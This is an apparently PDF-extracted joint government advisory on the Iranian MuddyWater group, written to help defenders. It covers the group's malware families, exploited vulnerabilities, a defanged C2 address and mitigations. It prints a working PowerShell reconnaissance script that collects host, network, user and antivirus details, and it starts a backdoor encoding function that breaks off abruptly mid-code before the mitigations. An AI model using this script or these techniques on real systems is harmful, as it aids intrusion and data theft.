See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.](https://attack.mitre.org/versions/v10/techniques/enterprise/)_\n\nThe Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Cyber\nCommand Cyber National Mission Force (CNMF), and the United Kingdom’s National Cyber Security Centre (NCSCUK) have observed a group of Iranian government-sponsored advanced persistent threat (APT) actors, known as\nMuddyWater, conducting cyber espionage and other malicious cyber operations targeting a range of government and\nprivate-sector organizations across sectors—including telecommunications, defense, local government, and oil and\nnatural gas—in Asia, Africa, Europe, and North America. Note: MuddyWater is also known as Earth Vetala, MERCURY,\nStatic Kitten, Seedworm, and TEMP.Zagros.\n\n[MuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security (MOIS).[1] This APT group](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\nhas conducted broad cyber campaigns in support of MOIS objectives since approximately 2018. MuddyWater actors are\npositioned both to provide stolen data and accesses to the Iranian government and to share these with other malicious\ncyber actors.\n\nMuddyWater actors are known to exploit publicly reported vulnerabilities and use open-source tools and strategies to\ngain access to sensitive data on victims’ systems and deploy ransomware. These actors also maintain persistence on\nvictim networks via tactics such as side-loading dynamic link libraries (DLLs)—to trick legitimate programs into running\nmalware—and obfuscating PowerShell scripts to hide command and control (C2) functions. FBI, CISA, CNMF, and\nNCSC-UK have observed MuddyWater actors recently using various malware—variants of PowGoop, Small Sieve,\nCanopy (also known as Starwhale), Mori, and POWERSTATS—along with other tools as part of their malicious activity.\n\nThis advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators of compromise\n(IOCs) associated with this Iranian government-sponsored APT activity to aid organizations in the identification of\nmalicious activity against sensitive networks.\n\nFBI, CISA, CNMF, NCSC-UK, and the National Security Agency (NSA) recommend organizations apply the mitigations\nin this advisory and review the following resources for additional information. Note: also see the Additional Resources\nsection.\n\n[Malware Analysis Report – MAR-10369127-1.v1: MuddyWater](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a)\nIOCs – [AA22-052A.stix and](https://www.cisa.gov/sites/default/files/publications/AA22-055A.stix.xml) [MAR-10369127-1.v1.stix](https://www.cisa.gov/sites/default/files/publications/MAR-10369127-1.v1.WHITE_stix.xml)\n[CISA's webpage – Iran Cyber Threat Overview and Advisories](https://www.cisa.gov/uscert/iran)\n[NCSC-UK MAR – Small Sieve](https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf)\n[CNMF's press release – Iranian intel cyber suite of malware uses open source tools](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\n\n[Click here for a PDF version of this report.](https://www.cisa.gov/sites/default/files/publications/AA22-055A_Iranian_Government-Sponsored_Actors_Conduct_Cyber_Operations.pdf)\n\n## Technical Details\n\n\n-----\n\nFBI, CISA, CNMF, and NCSC UK have observed the Iranian government sponsored MuddyWater APT group employing\nspearphishing, exploiting publicly known vulnerabilities, and leveraging multiple open-source tools to gain access to\nsensitive government and commercial networks.\n\nAs part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into downloading ZIP files,\ncontaining either an Excel file with a malicious macro that communicates with the actor’s C2 server or a PDF file that\n[drops a malicious file to the victim’s network [T1566.001,](https://attack.mitre.org/versions/v10/techniques/T1566/001/) [T1204.002]. MuddyWater actors also use techniques such as](https://attack.mitre.org/versions/v10/techniques/T1204/002)\n[side-loading DLLs [T1574.002] to trick legitimate programs into running malware and obfuscating PowerShell scripts](https://attack.mitre.org/versions/v10/techniques/T1574/002/)\n\n[[T1059.001] to hide C2 functions [T1027] (see the PowGoop section for more information).](https://attack.mitre.org/versions/v10/techniques/T1059/001/)\n\nAdditionally, the group uses multiple malware sets—including PowGoop, Small Sieve, Canopy/Starwhale, Mori, and\n[POWERSTATS—for loading malware, backdoor access, persistence [TA0003], and exfiltration [TA0010]. See below for](https://attack.mitre.org/versions/v10/tactics/TA0003/)\ndescriptions of some of these malware sets, including newer tools or variants to the group’s suite. Additionally, see\n[Malware Analysis Report MAR-10369127.r1.v1: MuddyWater for further details.](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a)\n\n**PowGoop**\n\nMuddyWater actors use new variants of PowGoop malware as their main loader in malicious operations; it consists of a\nDLL loader and a PowerShell-based downloader. The malicious file impersonates a legitimate file that is signed as a\nGoogle Update executable file.\n\n[According to samples of PowGoop analyzed by CISA and](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a) [CNMF, PowGoop consists of three components:](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\n\nA DLL file renamed as a legitimate filename, `Goopdate.dll, to enable the DLL side-loading technique`\n\n[[T1574.002]. The DLL file is contained within an executable,](https://attack.mitre.org/versions/v10/techniques/T1574/002/) `GoogleUpdate.exe .`\nA PowerShell script, obfuscated as a .dat file, `goopdate.dat, used to decrypt and run a second obfuscated`\nPowerShell script, `config.txt` [[T1059.001].](https://attack.mitre.org/versions/v10/techniques/T1059/001/)\n```\n   config.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded IP address.\n\n```\nThese components retrieve encrypted commands from a C2 server. The DLL file hides communications with\nMuddyWater C2 servers by executing with the Google Update service.\n\n**Small Sieve**\n\n[According to a sample analyzed by NCSC-UK, Small Sieve is a simple Python [T1059.006] backdoor distributed using a](https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf)\nNullsoft Scriptable Install System (NSIS) installer, `gram_app.exe . The NSIS installs the Python backdoor,`\n```\nindex.exe, and adds it as a registry run key [T1547.001], enabling persistence [TA0003].\n\n```\nMuddyWater disguises malicious executables and uses filenames and Registry key names associated with Microsoft's\nWindows Defender to avoid detection during casual inspection. The APT group has also used variations of Microsoft\n[(e.g., \"Microsift\") and Outlook in its filenames associated with Small Sieve [T1036.005].](https://attack.mitre.org/versions/v10/techniques/T1036/005/)\n\nSmall Sieve provides basic functionality required to maintain and expand a foothold in victim infrastructure and avoid\n[detection [TA0005] by using custom string and traffic obfuscation schemes together with the Telegram Bot application](https://attack.mitre.org/versions/v10/tactics/TA0005/)\nprogramming interface (API). Specifically, Small Sieve’s beacons and taskings are performed using Telegram API over\n[Hypertext Transfer Protocol Secure (HTTPS) [T1071.001], and the tasking and beaconing data is obfuscated through a](https://attack.mitre.org/versions/v10/techniques/T1071/001)\n[hex byte swapping encoding scheme combined with an obfuscated Base64 function [T1027],](https://attack.mitre.org/versions/v10/techniques/T1027) [T1132.002].](https://attack.mitre.org/versions/v10/techniques/T1132/002/)\n\n**Note: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to MuddyWater with**\nhigh confidence.\n\nSee Appendix B for further analysis of Small Sieve malware.\n\n**Canopy**\n\nMuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with targeted attachments\n\n[[T1566.001]. According to two Canopy/Starwhale samples analyzed by CISA, Canopy uses Windows Script File (.wsf)](https://attack.mitre.org/versions/v10/techniques/T1566/001)\nscripts distributed by a malicious Excel file. Note: the cybersecurity agencies of the United Kingdom and the United\nStates attribute these malware samples to MuddyWater with high confidence.\n\n\n-----\n\nIn the samples CISA analyzed, a malicious Excel file, `Cooperation terms.xls, contained macros written in Visual`\nBasic for Applications (VBA) and two encoded Windows Script Files. When the victim opens the Excel file, they receive\n[a prompt to enable macros [T1204.002]. Once this occurs, the macros are executed, decoding and installing the two](https://attack.mitre.org/versions/v10/techniques/T1204/002/)\nembedded Windows Script Files.\n\n[The first .wsf is installed in the current user startup folder [T1547.001] for persistence. The file contains hexadecimal](https://attack.mitre.org/versions/v10/techniques/T1547/001/)\n[(hex)-encoded strings that have been reshuffled [T1027]. The file executes a command to run the second .wsf.](https://attack.mitre.org/versions/v10/techniques/T1027/)\n\n[The second .wsf also contains hex-encoded strings that have been reshuffled. This file collects [TA0035] the victim](https://attack.mitre.org/versions/v10/tactics/TA0035/)\n[system’s IP address, computer name, and username [T1005]. The collected data is then hex-encoded and sent to an](https://attack.mitre.org/versions/v10/techniques/T1005/)\nadversary-controlled IP address, `http[:]88.119.170[.]124, via an HTTP POST request [T1041].`\n\n**Mori**\n\nMuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate with the group’s\n[C2 infrastructure [T1572].](https://attack.mitre.org/versions/v10/techniques/T1572/)\n\nAccording to one sample analyzed by CISA, `FML.dll, Mori uses a DLL written in C++ that is executed with`\n```\nregsvr32.exe with export DllRegisterServer ; this DLL appears to be a component to another program. FML.dll\n\n```\n[contains approximately 200MB of junk data [T1001.001] in a resource directory 205, number 105. Upon execution,](https://attack.mitre.org/versions/v10/techniques/T1001/001/)\n```\nFML.dll creates a mutex, 0x50504060, and performs the following tasks:\n\n```\nDeletes the file `FILENAME.old and deletes file by registry value. The filename is the DLL file with a` `.old`\nextension.\nResolves networking APIs from strings that are ADD-encrypted with the key 0x05 .\nUses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the JSON library\nfunctions. It appears likely that JSON is used to serialize C2 commands and/or their results.\nCommunicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified flag, for C2\n\n[[T1071.001].](https://attack.mitre.org/versions/v10/techniques/T1071/001/)\nReads and/or writes data from the following Registry Keys, `HKLM\\Software\\NFC\\IPA and` `HKLM\\Software\\NFC\\`\n```\n   (Default) .\n\n```\n**POWERSTATS**\n\nThis group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to maintain persistent\n[access to the victim systems [T1059.001].](https://attack.mitre.org/versions/v10/techniques/T1059)\n\nCNMF has posted samples further detailing the different parts of MuddyWater’s new suite of tools— along with\nJavaScript files used to establish connections back to malicious infrastructure—to the malware aggregation tool and\nrepository, [Virus Total. Network operators who identify multiple instances of the tools on the same network should](http://www.virustotal.com/en/user/CYBERCOM_Malware_Alert)\ninvestigate further as this may indicate the presence of an Iranian malicious cyber actor.\n\nMuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted operations. FBI, CISA,\nCNMF, and NCSC-UK have observed this APT group recently exploiting the Microsoft Netlogon elevation of privilege\n[vulnerability (CVE-2020-1472) and the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688). See](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472)\n[CISA’s Known Exploited Vulnerabilities Catalog for additional vulnerabilities with known exploits and joint Cybersecurity](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\nAdvisory: [Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities](https://www.cisa.gov/uscert/ncas/alerts/aa21-321a)\nfor additional Iranian APT group-specific vulnerability exploits.\n\n**Survey Script**\n\nThe following script is an example of a survey script used by MuddyWater to enumerate information about victim\ncomputers. It queries the Windows Management Instrumentation (WMI) service to obtain information about the\ncompromised machine to generate a string, with these fields separated by a delimiter (e.g., `;; in this sample). The`\nproduced string is usually encoded by the MuddyWater implant and sent to an adversary-controlled IP address.\n\n\n-----\n\n$O Get WmiObject Win32_OperatingSystem;$S $O.Name;$S + ;; ;$ips ;Get WmiObject\nWin32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | % {$ips = $ips + \", \" + $_.IPAddress[0]};$S +=\n$ips.substring(1);$S += \";;\";$S += $O.OSArchitecture;$S += \";;\";$S +=\n\n[System.Net.DNS]::GetHostByName('').HostName;$S += \";;\";$S += ((Get-WmiObject\nWin32_ComputerSystem).Domain);$S += \";;\";$S += $env:UserName;$S += \";;\";$AntiVirusProducts = Get-WmiObject Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct -ComputerName $env:computername;$resAnti =\n@();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti += $AntiVirusProduct.displayName};$S += $resAnti;echo\n$S;\n\n**Newly Identified PowerShell Backdoor**\n\nThe newly identified PowerShell backdoor used by MuddyWater below uses a single-byte Exclusive-OR (XOR) to\nencrypt communications with the key 0x02 to adversary-controlled infrastructure. The script is lightweight in functionality\nand uses the InvokeScript method to execute responses received from the adversary.\n\nfunction encode($txt,$key){$enByte =

and Architecture**\n\n**Deploy application control software to limit the applications and executable code that can be run by users.**\nEmail attachments and files downloaded via links in emails often contain executable code.\n\n**Identity and Access Management**\n\n**Use multifactor authentication where possible, particularly for webmail, virtual private networks, and accounts**\nthat access critical systems.\n**Limit the use of administrator privileges. Users who browse the internet, use email, and execute code with**\nadministrator privileges make for excellent spearphishing targets because their system—once infected—enables\nattackers to move laterally across the network, gain additional accesses, and access highly sensitive information.\n\n**Phishing Protection**\n\n**Enable antivirus and anti-malware software and update signature definitions in a timely manner. Well-**\nmaintained antivirus software may prevent use of commonly deployed attacker tools that are delivered via\nspearphishing.\n**Be suspicious of unsolicited contact via email or social media from any individual you do not know**\n**personally. Do not click on hyperlinks or open attachments in these communications.**\n**Consider adding an email banner to emails received from outside your organization and disabling**\n**hyperlinks in received emails.**\n**Train users through awareness and simulations to recognize and report phishing and social engineering**\n**attempts. Identify and suspend access of user accounts exhibiting unusual activity.**\n**Adopt threat reputation services at the network device, operating system, application, and email service**\n**levels. Reputation services can be used to detect or prevent low-reputation email addresses, files, URLs, and IP**\naddresses used in spearphishing attacks.\n\n**Vulnerability and Configuration Management**\n\n**Install updates/patch operating systems, software, and firmware as soon as updates/patches are released.**\n[Prioritize patching known exploited vulnerabilities.](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n\n## Additional Resources\n\nFor more information on Iranian government-sponsored malicious cyber activity, see CISA's webpage – Iran Cyber\nThreat Overview and Advisories and CNMF's press release – Iranian intel cyber suite of malware uses open\nsource tools.\nFor information and resources on protecting against and responding to ransomware, refer to\n[StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.](https://www.cisa.gov/stopransomware/)\n\n\n-----\n\nThe joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and\nthe United States: [Technical Approaches to Uncovering and Remediating Malicious Activity provides additional](https://us-cert.cisa.gov/sites/default/files/publications/AA20-245A-Joint_CSA-Technical_Approaches_to_Uncovering_Malicious_Activity_508.pdf)\nguidance when hunting or investigating a network and common mistakes to avoid in incident handling.\n[CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify,](https://www.cisa.gov/cyber-hygiene-services)\nand reduce their exposure to threats, including ransomware.
